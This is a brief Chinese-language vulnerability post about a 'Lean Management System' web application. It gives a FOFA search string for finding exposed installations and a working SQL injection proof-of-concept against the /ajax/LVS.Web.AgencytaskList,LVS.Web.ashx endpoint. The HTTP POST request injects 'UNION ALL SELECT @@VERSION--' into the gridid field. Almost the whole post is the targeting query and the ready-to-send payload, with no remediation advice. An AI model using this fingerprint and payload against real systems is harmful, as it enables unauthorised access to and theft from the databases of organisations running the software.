**fofa**

```
body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
```

**一、漏洞简述**

精益管理系统（Lean Management System）是一种以精益思维为基础的管理方法，旨在通过持续改进和团队合作，提高组织的效率和质量，降低成本和浪费。其接口LVS.Web.AgencytaskList,LVS.Web.ashx存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。



**二、漏洞检测poc**

```yaml
POST /ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Content-Type: text/plain; charset=UTF-8
Content-Length: 58

src=AgencytaskList
gridid=1' UNION ALL SELECT @@VERSION--
```

